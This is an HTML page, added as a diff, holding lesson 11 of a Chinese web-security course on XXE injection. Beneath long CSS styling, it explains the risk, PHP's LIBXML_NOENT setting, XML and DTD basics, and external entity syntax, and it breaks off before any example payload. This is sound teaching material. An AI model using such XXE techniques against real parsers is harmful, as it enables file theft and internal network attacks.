@@ -1,0 +1,1341 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>11 | XXE 漏洞：XML 解析器的坑</title>
+<style type="text/css">.hljs{display:block;overflow-x:auto;padding:.5em;color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#a626a4}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#986801}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}/*# sourceURL=/Users/young/Documents/Codes/Fun/lagou/public/atom-one-light.min.css*/</style><style type="text/css">/*
+ * Copyright (C) 2018 Drake, Inc.
+ *
+ * Licensed under the Apache License, Version 2.0 (the "License");
+ * you may not use this file except in compliance with the License.
+ * You may obtain a copy of the License at
+ *
+ * http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+:root {
+    --monospace: "JetBrains Mono", HYZhengYuan, "Fira Code", Menlo, "Ubuntu Mono", Consolas; /*code font*/
+    --text-font: var(--monospace); /*default font*/
+    --title-font: var(--monospace); /*title font*/
+
+    --text-color: #333333;
+    --bg-color: #ffffff;
+    --control-text-color: var(--text-color);
+    --meta-content-color: var(--text-color);
+    --active-file-border-color: var(--drake-accent);
+    --rawblock-edit-panel-bd: var(--code-block-bg-color);
+    --item-hover-bg-color: #E5E5E596;
+    --active-file-bg-color: var(--item-hover-bg-color);
+
+    --drake-accent: #e95f59;
+    --drake-highlight: #d63200;
+    --a-color: #036aca;
+    --variable-color: var(--drake-highlight);
+    --outline-active-color: var(--a-color);
+    --code-block-bg-color: #2b2b2b;
+    --code-block-color: #A9B7C6;
+    --title-color: #135ce0;
+    --blockquote-border-color: #b2aec5;
+    --blockquote-color: #595959;
+    --blockquote-bg-color: #fff9f9;
+    --strong-color: var(--title-color);
+    --h2-underline-color: var(--title-color);
+    --horizontal-divider-color: var(--title-color);
+    --height-light-color: var(--drake-highlight);
+    --height-light-border-color: var(--drake-highlight);
+    --yaml-color: #777777;
+    --yaml-bg-color: #f7f7f7;
+    --footnotes-bg-color: #3c3d3e;
+    --footnotes-highlight: #FFD760;
+    --table-border-color: #dfe2e5;
+    --table-header-bg-color: #f6f8fa;
+    --table-bg-color: var(--bg-color);
+    --table-n2-bg-color: #f6f8fa;
+    --input-bg-color: var(--item-hover-bg-color);
+    --btn-hover-bg-color: var(--item-hover-bg-color);
+    --checkbox-checked: url("data:image/svg+xml,%3Csvg class='icon' viewBox='0 0 1024 1024' xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Cpath d='M425.984 726.016l384-384-59.99-61.995-324.01 324.011-152.021-152.021L213.973 512zm384-598.016q36.01 0 61.013 25.984T896 213.974v596.01q0 34.005-25.003 59.99t-61.013 25.983h-596.01q-36.011 0-61.014-25.984t-25.003-59.989v-596.01q0-34.006 25.003-59.99T213.973 128h596.011z' fill='%2365b73b'/%3E%3C/svg%3E");
+    --checkbox-unchecked: url("data:image/svg+xml,%3Csvg class='icon' viewBox='0 0 1024 1024' xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Cpath d='M810.667 213.333v597.334H213.333V213.333h597.334m0-85.333H213.333C166.4 128 128 166.4 128 213.333v597.334C128 857.6 166.4 896 213.333 896h597.334C857.6 896 896 857.6 896 810.667V213.333C896 166.4 857.6 128 810.667 128z' fill='%23333333'/%3E%3C/svg%3E");
+}
+
+html {
+    font-size: 15px;
+}
+
+body {
+    font-family: var(--text-font) !important;
+    color: var(--text-color);
+    -webkit-font-feature-settings: "liga" on, "calt" on;
+    -webkit-font-smoothing: subpixel-antialiased;
+    text-rendering: optimizeLegibility;
+    letter-spacing: 0;
+    margin: 0;
+    overflow-x: hidden;
+    line-height: 1.8rem;
+}
+
+img {
+    max-width: 100%;
+}
+
+#write {
+    background-image: linear-gradient(
+            90deg
+            ,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(
+            1turn
+            ,rgba(60,10,30,.04) 3%,transparent 0);
+    background-size: 20px 20px;
+    background-position: 50%;
+}
+
+/*code block*/
+#write .md-fences {
+    font-size: 1rem;
+    padding: 0.5rem !important;
+    border-radius: 2px;
+    word-wrap: normal;
+    background-color: var(--code-block-bg-color);
+    color: var(--code-block-color);
+    border: none;
+}
+
+/*code snippet*/
+#write code, tt {
+    border-radius: 2px;
+    color: var(--drake-highlight);
+}
+
+/*variable*/
+var {
+    color: var(--variable-color);
+    font-weight: bold;
+}
+
+/*raw block*/
+.md-rawblock-control:not(.md-rawblock-tooltip) {
+    border-radius: 2px 0 2px 2px;
+    padding: 0.2rem !important;
+}
+.md-rawblock:hover > .md-rawblock-container {
+    background: none;
+}
+.md-rawblock-input {
+    font-size: 1rem;
+}
+.md-rawblock-tooltip-btn:hover {
+    background: none;
+}
+.md-rawblock:hover > .md-rawblock-tooltip {
+    border-radius: 2px 2px 0 0;
+    margin-bottom: 2px !important;
+}
+.md-rawblock-tooltip.md-rawblock-control {
+    border-radius: 2px 2px 0 0;
+    color: var(--code-block-color);
+}
+.md-rawblock-tooltip-name {
+    color: var(--code-block-color);
+    opacity: 1;
+}
+
+/*quote block*/
+blockquote:before {
+    display: block;
+    position: absolute;
+    content: '';
+    width: 4px;
+    left: 0;
+    top: 0;
+    height: 100%;
+    background-color: var(--blockquote-border-color);
+    border-radius: 2px;
+}
+
+blockquote {
+    color: var(--blockquote-color);
+    border-radius: 2px;
+    padding: 10px 16px;
+    background-color: var(--blockquote-bg-color);
+    position: relative;
+    border-left: none;
+}
+
+#write strong {
+    color: var(--strong-color);
+    font-weight: bold;
+}
+#write blockquote strong {
+    color: var(--blockquote-color);
+}
+
+/*link*/
+#write a {
+    color: var(--a-color);
+    text-decoration: none;
+}
+#write a .md-plain, .md-htmlblock-container a:hover {
+    border-bottom: .1rem solid var(--a-color);
+}
+[md-inline=link] a {
+    margin: 0 .2rem;
+}
+a:any-link {
+    color: var(--a-color);
+}
+
+img {
+    border-left: none;
+    border-right: none;
+    vertical-align: baseline;
+    border-radius: 2px;
+}
+
+#write {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 20px 30px 100px;
+}
+#typora-source .CodeMirror-lines {
+    max-width: 1200px;
+}
+
+#write p {
+    word-spacing: .05rem;
+}
+
+#write > ul:first-child,
+#write > ol:first-child {
+    margin-top: 30px;
+}
+
+body > *:first-child {
+    margin-top: 0 !important;
+}
+
+body > *:last-child {
+    margin-bottom: 0 !important;
+}
+
+h1,
+h2,
+h3,
+h4,
+h5,
+h6 {
+    font-family: var(--title-font);
+    position: relative;
+    margin-top: 2rem;
+    margin-bottom: 1rem;
+    font-weight: bold;
+    cursor: text;
+    color: var(--title-color);
+}
+
+h3.md-focus:before, h4.md-focus:before, h5.md-focus:before, h6.md-focus:before {
+    visibility: hidden;
+}
+
+h1 {
+    font-size: 1.6rem;
+    text-align: center;
+    margin-top: 0;
+}
+
+h2.md-end-block.md-heading {
+    font-size: 1.6rem;
+    display: inline-block;
+}
+
+h2.md-end-block.md-heading:after {
+    display: block;
+    content: '';
+    height: 2px;
+    margin-top: 4px;
+    background-color: var(--h2-underline-color);
+    border-radius: 2px;
+}
+
+h3 {
+    font-size: 1.4rem;
+}
+
+h4 {
+    font-size: 1.2rem;
+}
+
+h5 {
+    font-size: 1rem;
+}
+
+h6 {
+    font-size: 1rem;
+}
+
+h1:hover a.anchor,
+h2:hover a.anchor,
+h3:hover a.anchor,
+h4:hover a.anchor,
+h5:hover a.anchor,
+h6:hover a.anchor {
+    text-decoration: none;
+}
+
+h1 tt,
+h1 code {
+    font-size: inherit !important;
+}
+
+h2 tt,
+h2 code {
+    font-size: inherit !important;
+}
+
+h3 tt,
+h3 code {
+    font-size: inherit !important;
+}
+
+h4 tt,
+h4 code {
+    font-size: inherit !important;
+}
+
+h5 tt,
+h5 code {
+    font-size: inherit !important;
+}
+
+h6 tt,
+h6 code {
+    font-size: inherit !important;
+}
+
+blockquote,
+ul,
+ol,
+dl,
+table {
+    margin: 0.8em 0;
+}
+p {
+    margin: 0;
+}
+
+li > ol,
+li > ul {
+    margin: 0 0;
+}
+
+hr {
+    height: 2px;
+    padding: 0;
+    margin: 16px 0;
+    background-color: var(--horizontal-divider-color);
+    border: 0 none;
+    overflow: hidden;
+    box-sizing: content-box;
+}
+
+body > h2:first-child {
+    margin-top: 0;
+    padding-top: 0;
+}
+
+body > h1:first-child {
+    margin-top: 0;
+    padding-top: 0;
+}
+
+body > h1:first-child + h2 {
+    margin-top: 0;
+    padding-top: 0;
+}
+
+body > h3:first-child,
+body > h4:first-child,
+body > h5:first-child,
+body > h6:first-child {
+    margin-top: 0;
+    padding-top: 0;
+}
+
+a:first-child h1,
+a:first-child h2,
+a:first-child h3,
+a:first-child h4,
+a:first-child h5,
+a:first-child h6 {
+    margin-top: 0;
+    padding-top: 0;
+}
+
+h1 p,
+h2 p,
+h3 p,
+h4 p,
+h5 p,
+h6 p {
+    margin-top: 0;
+}
+
+li p.first {
+    display: inline-block;
+}
+
+ul, ol {
+    padding-inline-start: 2em;
+}
+
+ul:first-child,
+ol:first-child {
+    margin-top: 0;
+}
+
+ul:last-child,
+ol:last-child {
+    margin-bottom: 0;
+}
+
+table {
+    padding: 0;
+    word-break: initial;
+    background-color: var(--table-bg-color);
+}
+table tr {
+    border-top: .1em solid var(--table-border-color);
+    margin: 0;
+    padding: 0;
+}
+table th {
+    font-weight: bold;
+    border: .1em solid var(--table-border-color);
+    border-bottom: 0;
+    margin: 0;
+    padding: 6px 13px;
+}
+table td {
+    border: .1em solid var(--table-border-color);
+    margin: 0;
+    padding: 6px 13px;
+}
+table thead {
+    background-color: var(--table-header-bg-color);
+}
+table tr:nth-child(2n) {
+    background-color: var(--table-n2-bg-color);
+}
+table tr th:first-child,
+table tr td:first-child {
+    margin-top: 0;
+}
+table tr th:last-child,
+table tr td:last-child {
+    margin-bottom: 0;
+}
+
+#write em {
+    padding: 0 5px 0 2px;
+}
+
+/* height light */
+#write mark {
+    border: .1em solid var(--height-light-border-color);
+    color: var(--height-light-color);
+    background-color: transparent;
+    padding: .1rem .5rem;
+    border-radius: 2rem;
+    margin: 0 .2rem;
+    font-size: .95rem;
+}
+
+/*shortcut*/
+kbd {
+    border: .1em solid #5b5b5e;
+    background: transparent;
+    color: var(--text-color);
+    margin: 0 .4rem;
+    font-size: .95rem;
+    padding: .3em .4em;
+    border-radius: .4em;
+    vertical-align: top;
+    box-shadow: .1em .1em .2em rgba(0, 0, 0, 0.3);
+}
+
+#write del {
+    padding: 1px 2px;
+}
+
+.md-task-list-item > input {
+    margin-left: -1.3em;
+}
+
+@media print {
+    html {
+        font-size: 12px;
+    }
+
+    table,
+    pre {
+        page-break-inside: avoid;
+    }
+
+    pre {
+        word-wrap: break-word;
+    }
+}
+
+/*YAML*/
+#write pre.md-meta-block {
+    padding: 1rem;
+    font-size: 1rem;
+    background-color: var(--yaml-bg-color);
+    border: 0;
+    border-radius: 2px;
+    color: var(--yaml-color);
+    margin-top: 0 !important;
+}
+
+.mathjax-block > .code-tooltip {
+    bottom: .375rem;
+}
+
+#write > h3.md-focus:before {
+    left: -1.5625rem;
+    top: .375rem;
+}
+
+#write > h4.md-focus:before {
+    left: -1.5625rem;
+    top: .285714286rem;
+}
+
+#write > h5.md-focus:before {
+    left: -1.5625rem;
+    top: .285714286rem;
+}
+
+#write > h6.md-focus:before {
+    left: -1.5625rem;
+    top: .285714286rem;
+}
+
+.md-image > .md-meta {
+    border-radius: 2px;
+    font-family: initial;
+    padding: 2px 0 0 4px;
+    color: inherit;
+}
+
+.md-tag {
+    color: inherit;
+}
+
+.md-toc {
+    margin-top: 20px;
+    padding-bottom: 20px;
+}
+
+.typora-quick-open-item {
+    font-size: 1rem !important;
+    height: 50px;
+    padding-left: 8px;
+    padding-top: 4px;
+    padding-bottom: 4px;
+}
+
+#typora-quick-open {
+    box-shadow: 0 0 8px #00000045;
+    padding: 0;
+}
+
+.ty-quick-open-category.ty-has-prev .ty-quick-open-category-title {
+    border-top: none;
+}
+
+#typora-quick-open-input {
+    margin: 8px;
+    box-shadow: none;
+    border-radius: 2px;
+}
+
+#typora-quick-open-input input {
+    font-size: 1rem;
+    box-shadow: none;
+    padding-top: 2px;
+    padding-left: 10px;
+    padding-right: 10px;
+    line-height: 32px;
+    max-height: 32px;
+    border: none;
+}
+
+.modal-dialog#typora-quick-open {
+    border-radius: 8px;
+}
+
+.ty-quick-open-category-title {
+    padding-left: 8px;
+    color: #BEBEBE;
+    font-size: 0.8rem;
+    margin-bottom: 4px;
+}
+
+.typora-quick-open-item-path {
+    font-size: 0.8rem;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+    margin-top: 1px;
+}
+
+/*search input*/
+.form-control {
+    border: none;
+    border-radius: 2px;
+    box-shadow: none;
+}
+
+#md-searchpanel .btn {
+    border-radius: 2px;
+}
+
+#search-panel-replaceall-btn {
+    padding-right: 5px !important;
+    text-align: center !important;
+}
+
+#search-panel-replace-btn {
+    text-align: center !important;
+}
+
+#md-searchpanel input {
+    background: var(--input-bg-color);
+    border-radius: 2px;
+}
+
+.searchpanel-search-option-btn {
+    border-radius: 2px;
+    border: none;
+    background: transparent;
+    color: var(--text-color);
+}
+
+.searchpanel-search-option-btn.active {
+    background: var(--text-color);
+    color: var(--bg-color);
+}
+
+.form-control:focus {
+    box-shadow: none;
+}
+
+#md-notification:before {
+    top: 10px;
+}
+
+/** focus mode */
+.on-focus-mode blockquote {
+    border-left-color: rgba(85, 85, 85, 0.12);
+}
+
+header,
+.context-menu,
+.megamenu-content,
+footer {
+    font-family: initial;
+}
+
+/*sidebar*/
+.file-node-content:hover .file-node-icon,
+.file-node-content:hover .file-node-open-state {
+    visibility: visible;
+}
+
+#typora-sidebar {
+    font-size: 1.1rem;
+}
+
+.sidebar-tabs {
+    border-bottom: none;
+}
+
+.file-list-item-summary, .file-list-item-parent-loc, .file-list-item-time, .file-list-item-summary {
+    font-size: 0.9rem !important;
+    font-family: var(--text-font);
+}
+
+.file-list-item-file-ext-part {
+    display: none;
+}
+
+.outline-item {
+    font-size: 1rem;
+}
+
+/*footnotes mark*/
+#write .md-footnote {
+    background-color: inherit;
+    color: var(--drake-highlight);
+    font-size: 0.9rem;
+    border-radius: 0.9rem;
+    padding-left: 0;
+}
+
+#write .md-footnote:before {
+    content: "[";
+}
+
+#write .md-footnote:after {
+    content: "]";
+}
+
+/*footnotes content*/
+.md-hover-tip .code-tooltip-content {
+    border-radius: 2px;
+}
+
+/*footnotes title*/
+span.md-def-name {
+    padding-right: 3ch;
+    padding-left: 0;
+    position: relative;
+    font-weight: normal;
+}
+
+/*footnotes desc*/
+.footnotes {
+    font-size: 1rem;
+    font-weight: normal;
+    color: var(--text-color);
+    position: relative;
+}
+
+/*footnotes tooltip text*/
+.code-tooltip-content .md-plain {
+    font-size: 0.9rem;
+    font-family: inherit;
+}
+
+.code-tooltip-content code {
+    padding: 0 2px;
+    font-family: inherit;
+    color: var(--footnotes-highlight);
+    background-color: inherit;
+}
+
+.code-tooltip-content a {
+    color: var(--footnotes-highlight);
+}
+
+div.code-tooltip-content {
+    box-shadow: 0 0 8px #00000045;
+    background: var(--footnotes-bg-color);
+}
+
+.footnotes {
+    opacity: 1;
+}
+
+.md-def-name:after {
+    content: ". ^";
+    color: var(--text-color);
+}
+
+.md-def-footnote .md-def-name:before {
+    content: "";
+    color: var(--text-color);
+    position: absolute;
+}
+
+.md-def-name:before {
+    content: "";
+    color: var(--text-color);
+    position: absolute;
+}
+
+.md-content.md-url, .md-def-content.md-def-url.md-auto-disp {
+    text-decoration: none;
+    border-bottom: .1rem solid var(--text-color);
+}
+
+.CodeMirror-scroll::-webkit-scrollbar {
+    display: none;
+}
+
+.file-list-item-summary {
+    font-size: 1em;
+}
+
+.pin-outline #outline-content .outline-active strong, .pin-outline .outline-active {
+    font-weight: 500;
+    color: var(--outline-active-color);
+}
+
+.file-list-item.active {
+    border-left: 4px solid var(--drake-accent);
+}
+
+#md-searchpanel .btn:not(.close-btn):hover {
+    box-shadow: none;
+    background: var(--btn-hover-bg-color);
+}
+
+/*checkbox*/
+#write input[type=checkbox] {
+    opacity: 0;
+    height: 1.6rem;
+    width: 1.6rem;
+    margin-left: -2em;
+    margin-top: 0;
+    top: 0;
+}
+
+#write .ul-list li.md-task-list-item.task-list-done::before {
+    content: "";
+    background: var(--checkbox-checked) 0 0 no-repeat;
+    background-size: 100%;
+    display: inline-block;
+    position: absolute;
+    height: 1.6rem;
+    width: 1.6rem;
+    margin-left: -2em;
+}
+
+#write .ul-list li.md-task-list-item.task-list-not-done::before {
+    content: "";
+    background: var(--checkbox-unchecked) 0 0 no-repeat;
+    background-size: 100%;
+    display: inline-block;
+    position: absolute;
+    height: 1.6rem;
+    width: 1.6rem;
+    margin-left: -2em;
+}
+
+/*insert table*/
+.btn {
+    border-radius: 2px;
+}
+
+.modal-content {
+    border-radius: 8px;
+}
+
+.btn-primary:hover, .btn-primary:active {
+    background-color: var(--btn-hover-bg-color);
+    color: var(--drake-highlight);
+}
+
+.btn-primary {
+    background-color: transparent;
+    color: var(--drake-highlight);
+}
+
+.btn-default {
+    background-color: transparent;
+}
+
+.btn:active {
+    box-shadow: none;
+    border-color: transparent;
+}
+
+.modal-footer {
+    border-top: none;
+}
+
+#table-insert-col, #table-insert-row {
+    background: var(--input-bg-color);
+    border-radius: 2px;
+}
+
+/*preference panel*/
+#megamenu-content {
+    background-image: none !important;
+    background-color: var(--bg-color);
+}
+#top-titlebar {
+    height: inherit;
+    background-color: var(--bg-color);
+}
+#megamenu-menu-sidebar {
+    background-color: var(--bg-color);
+    color: var(--text-color);
+}
+.long-btn {
+    width: inherit;
+    min-width: 300px;
+    border: 1px solid var(--text-color);
+    border-radius: 6px;
+}
+.megamenu-menu-panel h1 {
+    margin-bottom: 3rem;
+    text-align: left;
+}
+.megamenu-menu-panel h1, .megamenu-menu-panel h2 {
+    font-weight: normal;
+}
+#recent-file-panel-search-input {
+    height: 45px;
+    border: none;
+    border-bottom: 1px solid var(--text-color);
+    padding-left: 8px;
+}
+#recent-file-panel-search-input::placeholder {
+    color: var(--text-color);
+    opacity: .5;
+}
+.megamenu-menu-header {
+    border-bottom: none;
+}
+#recent-file-panel-action-btn {
+    background: none;
+    border: none;
+}
+#recent-file-panel-action-btn-container {
+    float: none;
+    display: inline-block;
+}
+#top-titlebar .toolbar-icon.btn.hover, #top-titlebar .toolbar-icon.btn:hover {
+    background-color: var(--btn-hover-bg-color);
+    color: var(--text-color);
+}
+.megamenu-menu-panel .btn:hover {
+    background-color: var(--btn-hover-bg-color) !important;
+    color: var(--text-color);
+}
+#recent-file-panel tbody tr:nth-child(2n-1),
+.megamenu-menu-panel table thead,
+.megamenu-menu-panel table tr {
+    background-color: transparent;
+}
+.megamenu-menu-panel table {
+    font-weight: normal;
+}
+#megamenu-back-btn {
+    color: var(--text-color);
+    border: 1px solid var(--text-color);
+}
+.megamenu-menu-header #megamenu-menu-header-title {
+    color: var(--text-color);
+}
+header, .context-menu, .megamenu-content, footer {
+    font-family: var(--text-font);
+}
+.ty-preferences select {
+    padding-left: 2px;
+}
+.preference-item-hint {
+    font-size: 14px;
+}
+a.ty-link {
+    color: var(--a-color);
+    margin: 0 .2rem;
+}
+
+/**
+    code render
+    Name: IntelliJ IDEA darcula theme
+    From IntelliJ IDEA by JetBrains
+ */
+.cm-s-inner.CodeMirror {
+    background: var(--code-block-bg-color);
+    color: var(--code-block-color);
+}
+
+.cm-s-inner span.cm-meta {
+    color: #BBB529;
+}
+
+.cm-s-inner span.cm-number {
+    color: #6897BB;
+}
+
+.cm-s-inner span.cm-keyword {
+    color: #CC7832;
+}
+
+.cm-s-inner span.cm-def {
+    color: #FFD760;
+}
+
+.cm-s-inner span.cm-variable {
+    color: var(--code-block-color);
+}
+
+.cm-s-inner span.cm-variable-2 {
+    color: var(--code-block-color);
+}
+
+.cm-s-inner span.cm-variable-3 {
+    color: #9876AA;
+}
+
+.cm-s-inner span.cm-type {
+    color: #AABBCC;
+}
+
+.cm-s-inner span.cm-property {
+    color: #FFC66D;
+}
+
+.cm-s-inner span.cm-operator {
+    color: var(--code-block-color);
+}
+
+.cm-s-inner span.cm-string {
+    color: #6A8759;
+}
+
+.cm-s-inner span.cm-string-2 {
+    color: #6A8759;
+}
+
+.cm-s-inner span.cm-comment {
+    color: #787878;
+}
+
+.cm-s-inner span.cm-link {
+    color: #CC7832;
+}
+
+.cm-s-inner span.cm-atom {
+    color: #CC7832;
+}
+
+.cm-s-inner span.cm-error {
+    color: #BC3F3C;
+}
+
+.cm-s-inner span.cm-tag {
+    color: #E8BF6A;
+}
+
+.cm-s-inner span.cm-quote {
+    color: #a6e22e;
+}
+
+.cm-s-inner span.cm-attribute {
+    color: #9876AA;
+}
+
+.cm-s-inner span.cm-qualifier {
+    color: #6A8759;
+}
+
+.cm-s-inner span.cm-bracket {
+    color: #E8BF6A;
+}
+
+.cm-s-inner span.cm-builtin {
+    color: #FF9E59;
+}
+
+.cm-s-inner span.cm-special {
+    color: #FF9E59;
+}
+
+.cm-s-inner span.cm-matchhighlight {
+    color: #FFFFFF;
+    background-color: rgba(50, 89, 48, .7);
+    font-weight: normal;
+}
+
+.cm-s-inner span.cm-searching {
+    color: #FFFFFF;
+    background-color: rgba(61, 115, 59, .7);
+    font-weight: normal;
+}
+
+.cm-s-inner .CodeMirror-gutters {
+    border-right: 1px solid rgba(120, 120, 120, 0.3);
+}
+
+.cm-s-inner .CodeMirror-linenumber {
+    color: #585b5d;
+}
+
+.cm-s-inner .CodeMirror-matchingbracket {
+    background-color: #3B514D;
+    color: #FFEF28 !important;
+}
+
+.cm-s-inner .CodeMirror-selected {
+    background: #214283 !important;
+}
+
+.cm-s-inner .CodeMirror-selectedtext {
+    background: #214283 !important;
+}
+
+.cm-s-typora-default .CodeMirror-selectedtext {
+    background: var(--select-text-bg-color) !important;
+}
+
+.cm-overlay.CodeMirror-selectedtext {
+    background: var(--select-text-bg-color) !important;
+}
+
+.cm-s-inner div.CodeMirror-cursor {
+    border-left: 1px solid var(--code-block-color);
+}/*# sourceURL=/Users/didi/Documents/Codes/Fun/lagou/public/drake-juejin.css*/</style></head>
+<body>
+  <div id="write"><h1>11 | XXE 漏洞：XML 解析器的坑</h1><p data-nodeid="1029" class="">上一讲我们介绍了 SSRF 漏洞，一种专门针对服务端的请求伪造攻击，常被用于攻击内网。在里面我介绍了 Burp Collaborator 用于专门测试无回显漏洞的功能，在本讲的 XXE 漏洞测试中，我们依然可以使用，不知道你是否还记得怎么使用？</p>
+<p data-nodeid="1030">下面，我们就开始今天的课程，一场关于 XML 外部实体注入（XXE）漏洞的攻防之路。</p>
+<h3 data-nodeid="1031">XXE：XML 外部实体注入</h3>
+<p data-nodeid="1032">XXE（XML External Entity，XML 外部实体注入）正是当允许引用外部实体时，通过构造恶意内容，导致读取任意文件、执行系统命令、内网探测与攻击等危害的一类漏洞。</p>
+<blockquote data-nodeid="1033">
+<p data-nodeid="1034">是不是想到了上节课讲的 SSRF？没错，利用 XXE 可以造成 SSRF。</p>
+</blockquote>
+<p data-nodeid="1035">PHP 默认使用 libxml 来解析 XML，但是从 libxml 2.9.0 开始，它默认不再解析外部实体，导致 PHP 下的 XXE 漏洞已经逐渐消失，除非你指定 LIBLXML_NOENT 去开启外部实体解析，才会存在 XXE 漏洞。</p>
+<pre class="lang-php hljs" data-nodeid="1036"><code data-language="php">simplexml_load_string($xml, <span class="hljs-string">'SimpleXMLElement'</span>, LIBXML_NOENT);
+</code></pre>
+<p data-nodeid="1037">本文也不打算再讲 PHP 环境下的 XXE 漏洞，Java 才是 XXE 漏洞最常见的语言，因此主要以 Java 为例做一些介绍。但在漏洞利用的实例演示上，我依然用 Pikachu 靶场的 XXE 题目（PHP），因为 XXE 在利用上与语言无关，无论是 php、java 还是 C、python，利用技巧都是一样的。</p>
+<h3 data-nodeid="1038">那么，什么是 XML？</h3>
+<p data-nodeid="1039">XML（Extensible Markup Language）意为可扩展性标记语言，我将介绍下 XML 的一些基础知识，方便你更好地理解漏洞原理。</p>
+<h4 data-nodeid="1040">1.XML 文档结构</h4>
+<p data-nodeid="1041">XML 文档结构包括 XML 声明、文档类型定义（DTD）、文档元素，具体可以参考以下示例。</p>
+<pre class="lang-xml hljs" data-nodeid="1042"><code data-language="xml"><span class="hljs-comment">&lt;!--XML声明--&gt;</span>
+<span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span> 
+<span class="hljs-comment">&lt;!--文档类型定义--&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">people</span> [  &lt;!--定义此文档是 people 类型的文档--&gt;
+  <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">people</span> (<span class="hljs-meta-keyword">name</span>,<span class="hljs-meta-keyword">age</span>,<span class="hljs-meta-keyword">mail</span>)&gt;</span>  &lt;!--定义people元素有3个元素--&gt;
+  <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">name</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>     &lt;!--定义name元素为“#PCDATA”类型--&gt;
+  <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">age</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义age元素为“#PCDATA”类型--&gt;
+  <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">mail</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义mail元素为“#PCDATA”类型--&gt;
+]]]&gt;</span>
+<span class="hljs-comment">&lt;!--文档元素--&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">people</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>john<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">age</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">age</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">mail</span>&gt;</span>john@qq.com<span class="hljs-tag">&lt;/<span class="hljs-name">mail</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">people</span>&gt;</span>
+</code></pre>
+<p data-nodeid="1043">三者其中，与 XXE 漏洞相关的主要在于文档类型定义（DTD），所以下面主要重点来介绍下 DTD。</p>
+<h4 data-nodeid="1044">2.DTD 实体声明</h4>
+<p data-nodeid="1045">DTD（Document Type Definition，文档类型定义）用于定义 XML 文档结构，包括元素的定义规则、元素间的关系规则、属性的定义规则，其定义结构如下：</p>
+<pre class="lang-xml hljs" data-nodeid="1046"><code data-language="xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 [定义内容]&gt;</span>
+</code></pre>
+<p data-nodeid="1047">DTD 实体就是变量，它既可以在文档内部声明，也可以外部引用，供在 XML 文档里面去使用。</p>
+<ul data-nodeid="1048">
+<li data-nodeid="1049">
+<p data-nodeid="1050"><strong data-nodeid="1154">内部实体声明</strong></p>
+</li>
+</ul>
+<p data-nodeid="1051">内部声明采用如下格式定义：</p>
+<pre class="lang-xml hljs" data-nodeid="1052"><code data-language="xml">  <span class="hljs-meta">&lt;!ENTITY 实体名 <span class="hljs-meta-string">"实体值"</span>&gt;</span>
+</code></pre>
+<p data-nodeid="1053">声明之后就可以通过“&amp;实体名;”来获取，示例如下：</p>
+<pre class="lang-xml hljs" data-nodeid="1054"><code data-language="xml">  <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [
+    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">test</span> <span class="hljs-meta-string">"john"</span>&gt;</span>
+  ]&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;test;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">root</span>
+</span></code></pre>
+<ul data-nodeid="1055">
+<li data-nodeid="1056">
+<p data-nodeid="1057"><strong data-nodeid="1162">外部实体引用</strong></p>
+</li>
+</ul>
+<p data-nodeid="1058">XXE 的产生正是外部实体引用的结果，可分为普通实体和参数实体。</p>
+<p data-nodeid="1059"><strong data-nodeid="1168">（1）普通实体</strong>声明格式如下：</p>
+<pre class="lang-java hljs" data-nodeid="1060"><code data-language="java">&lt;!ENTITY 实体名 SYSTEM <span class="hljs-string">"URI"</span>&gt;
+或者
+&lt;!ENTITY 实体名 PUBLIC <span class="hljs-string">"public_ID"</span> <span class="hljs-string">"URI"</span>&gt;
+</code></pre>
+<p data-nodeid="1061">举个例子：</p>
